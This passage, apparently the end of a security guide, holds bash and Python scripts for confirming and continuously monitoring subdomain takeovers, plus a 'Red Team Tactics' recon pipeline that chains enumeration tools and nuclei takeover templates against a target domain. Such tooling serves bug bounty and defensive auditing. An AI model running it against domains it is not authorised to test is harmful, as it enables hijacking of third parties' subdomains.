if __name__ == "__main__":
    main()
```

## 🎯 Phase 3: Verification & Monitoring

### Automated Takeover Verification
```bash
#!/bin/bash
# verify_takeovers.sh - Verify successful subdomain takeovers

echo "🔍 Verifying subdomain takeovers..."

# Read vulnerable subdomains
if [ ! -f "vulnerable_subdomains.json" ]; then
    echo "❌ vulnerable_subdomains.json not found"
    exit 1
fi

# Extract subdomains from JSON
cat vulnerable_subdomains.json | jq -r '.[].subdomain' > subdomains_to_verify.txt

echo "🎯 Verifying $(wc -l < subdomains_to_verify.txt) subdomains..."

# Verification function
verify_subdomain() {
    local subdomain=$1
    echo "Checking: $subdomain"
    
    # Check HTTP response
    response=$(curl -s -L -w "%{http_code}|%{url_effective}" "$subdomain" -m 10)
    http_code=$(echo "$response" | tail -1 | cut -d'|' -f1)
    final_url=$(echo "$response" | tail -1 | cut -d'|' -f2)
    content=$(echo "$response" | head -n -1)
    
    # Check for takeover indicators
    if echo "$content" | grep -qi "subdomain takeover\|takeover successful\|poc"; then
        echo "✅ TAKEOVER CONFIRMED: $subdomain (HTTP: $http_code)"
        echo "$subdomain|CONFIRMED|$http_code|$final_url" >> confirmed_takeovers.txt
    elif [[ "$http_code" == "200" ]]; then
        echo "⚠️  NEEDS VERIFICATION: $subdomain (HTTP: $http_code)"
        echo "$subdomain|NEEDS_VERIFICATION|$http_code|$final_url" >> needs_verification.txt
    else
        echo "❌ NOT TAKEN OVER: $subdomain (HTTP: $http_code)"
        echo "$subdomain|NOT_CONFIRMED|$http_code|$final_url" >> not_confirmed.txt
    fi
}

# Clear previous results
> confirmed_takeovers.txt
> needs_verification.txt
> not_confirmed.txt

# Verify each subdomain
while read subdomain; do
    verify_subdomain "https://$subdomain"
    sleep 1  # Rate limiting
done < subdomains_to_verify.txt

# Summary
echo ""
echo "📊 Verification Summary:"
echo "✅ Confirmed takeovers: $(wc -l < confirmed_takeovers.txt 2>/dev/null || echo 0)"
echo "⚠️  Need verification: $(wc -l < needs_verification.txt 2>/dev/null || echo 0)"
echo "❌ Not confirmed: $(wc -l < not_confirmed.txt 2>/dev/null || echo 0)"

echo ""
echo "🎯 Confirmed Takeovers:"
if [ -f "confirmed_takeovers.txt" ]; then
    cat confirmed_takeovers.txt
fi
```

### Continuous Monitoring Script
```python
#!/usr/bin/env python3
# monitor_takeovers.py - Continuous monitoring of subdomain takeovers

import requests
import json
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import schedule
from datetime import datetime

class TakeoverMonitor:
    def __init__(self, config_file='monitor_config.json'):
        with open(config_file, 'r') as f:
            self.config = json.load(f)
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def check_takeover_status(self, subdomain):
        """Check if subdomain takeover is still active"""
        try:
            response = self.session.get(f"https://{subdomain}", timeout=10)
            
            # Check for PoC indicators
            poc_indicators = [
                'subdomain takeover',
                'takeover successful',
                'poc',
                'proof of concept',
                'vulnerability demonstration'
            ]
            
            content_lower = response.text.lower()
            
            for indicator in poc_indicators:
                if indicator in content_lower:
                    return {
                        'status': 'active',
                        'http_code': response.status_code,
                        'indicator': indicator,
                        'content_preview': response.text[:500]
                    }
            
            return {
                'status': 'inactive',
                'http_code': response.status_code,
                'content_preview': response.text[:500]
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'error': str(e)
            }
    
    def monitor_takeovers(self):
        """Monitor all confirmed takeovers"""
        print(f"🔍 Starting takeover monitoring at {datetime.now()}")
        
        # Load confirmed takeovers
        try:
            with open('confirmed_takeovers.json', 'r') as f:
                takeovers = json.load(f)
        except FileNotFoundError:
            print("❌ No confirmed takeovers file found")
            return
        
        status_changes = []
        
        for takeover in takeovers:
            subdomain = takeover['subdomain']
            previous_status = takeover.get('last_status', 'unknown')
            
            current_status = self.check_takeover_status(subdomain)
            
            if current_status['status'] != previous_status:
                status_changes.append({
                    'subdomain': subdomain,
                    'previous_status': previous_status,
                    'current_status': current_status['status'],
                    'details': current_status
                })
                
                # Update status
                takeover['last_status'] = current_status['status']
                takeover['last_checked'] = datetime.now().isoformat()
                takeover['status_details'] = current_status
            
            print(f"📊 {subdomain}: {current_status['status']}")
        
        # Save updated status
        with open('confirmed_takeovers.json', 'w') as f:
            json.dump(takeovers, f, indent=2)
        
        # Send notifications if there are status changes
        if status_changes:
            self.send_notification(status_changes)
        
        print(f"✅ Monitoring completed at {datetime.now()}")
    
    def send_notification(self, status_changes):
        """Send email notification about status changes"""
        if not self.config.get('email_notifications', {}).get('enabled', False):
            return
        
        email_config = self.config['email_notifications']
        
        # Create email content
        subject = f"Subdomain Takeover Status Changes - {len(status_changes)} changes"
        
        body = f"""
        Subdomain Takeover Monitoring Report
        Generated: {datetime.now()}
        
        Status Changes Detected:
        
        """
        
        for change in status_changes:
            body += f"""
        Subdomain: {change['subdomain']}
        Previous Status: {change['previous_status']}
        Current Status: {change['current_status']}
        Details: {change['details']}
        
        ---
        
        """
        
        # Send email
        try:
            msg = MIMEMultipart()
            msg['From'] = email_config['from_email']
            msg['To'] = email_config['to_email']
            msg['Subject'] = subject
            
            msg.attach(MIMEText(body, 'plain'))
            
            server = smtplib.SMTP(email_config['smtp_server'], email_config['smtp_port'])
            server.starttls()
            server.login(email_config['username'], email_config['password'])
            
            text = msg.as_string()
            server.sendmail(email_config['from_email'], email_config['to_email'], text)
            server.quit()
            
            print(f"📧 Notification sent to {email_config['to_email']}")
            
        except Exception as e:
            print(f"❌ Failed to send notification: {str(e)}")

# Usage
def main():
    # Create default config if it doesn't exist
    default_config = {
        "email_notifications": {
            "enabled": False,
            "smtp_server": "smtp.gmail.com",
            "smtp_port": 587,
            "username": "your_email@gmail.com",
            "password": "your_app_password",
            "from_email": "your_email@gmail.com",
            "to_email": "your_email@gmail.com"
        },
        "monitoring_interval": 3600  # 1 hour
    }
    
    try:
        with open('monitor_config.json', 'r') as f:
            config = json.load(f)
    except FileNotFoundError:
        with open('monitor_config.json', 'w') as f:
            json.dump(default_config, f, indent=2)
        print("📝 Created default monitor_config.json - please configure email settings")
        config = default_config
    
    monitor = TakeoverMonitor()
    
    # Schedule monitoring
    schedule.every(config['monitoring_interval']).seconds.do(monitor.monitor_takeovers)
    
    print(f"🚀 Starting continuous monitoring (interval: {config['monitoring_interval']} seconds)")
    
    # Run initial check
    monitor.monitor_takeovers()
    
    # Keep running
    while True:
        schedule.run_pending()
        time.sleep(60)  # Check every minute

if __name__ == "__main__":
    main()
```

## 🎯 Elite Pro Tips for Subdomain Takeover

### Advanced Techniques:
1. **DNS History Analysis**: Use SecurityTrails, DNSdumpster to find historical DNS records
2. **Certificate Transparency Monitoring**: Monitor CT logs for new subdomains
3. **Wildcard Certificate Abuse**: Look for wildcard certs that might cover vulnerable subdomains
4. **Cloud Service Enumeration**: Check for unused cloud resources (S3 buckets, Azure blobs, etc.)
5. **Third-party Service Integration**: Monitor for abandoned integrations with SaaS platforms

### Automation Tips:
1. **Continuous Monitoring**: Set up automated monitoring for new subdomains
2. **Integration with Recon Tools**: Integrate with existing recon pipelines
3. **Notification Systems**: Set up alerts for new vulnerable subdomains
4. **Proof of Concept Automation**: Automate PoC creation and deployment
5. **Documentation Generation**: Auto-generate reports and documentation

### Red Team Tactics:
```bash
# Advanced subdomain discovery using multiple sources
cat > advanced_subdomain_discovery.sh << 'EOF'
#!/bin/bash
TARGET=$1

# Combine multiple tools
subfinder -d $TARGET -silent | anew subdomains.txt
amass enum -passive -d $TARGET | anew subdomains.txt
assetfinder --subs-only $TARGET | anew subdomains.txt
findomain -t $TARGET -q | anew subdomains.txt

# Certificate transparency
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew subdomains.txt

# GitHub dorking
gh-dorker -d $TARGET -t $GITHUB_TOKEN | anew subdomains.txt

# DNS brute force with custom wordlist
puredns bruteforce wordlist.txt $TARGET | anew subdomains.txt

# Check for takeovers
cat subdomains.txt | httpx -silent | nuclei -t subdomain-takeover/ -o takeover_results.txt
EOF
```

This comprehensive subdomain takeover framework provides everything needed to discover, analyze, exploit, and monitor subdomain takeover vulnerabilities at an elite level.
